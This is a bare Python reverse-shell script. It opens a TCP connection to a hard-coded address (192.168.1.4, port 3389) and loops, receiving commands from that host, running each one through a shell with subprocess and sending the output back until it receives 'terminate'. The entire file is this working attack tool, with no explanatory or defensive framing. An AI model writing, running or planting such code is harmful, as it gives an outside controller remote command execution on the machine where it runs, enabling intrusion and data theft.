import socket
import subprocess 

def connect():

	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.4', 3389))

	while True:
		command = s.recv(1024)
		if 'terminate' in command:
			s.close()
			break
		else:

			cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( cmd.stdout.read()	)
			s.send( cmd.stderr.read()	)
def main ():
	connect()
main()
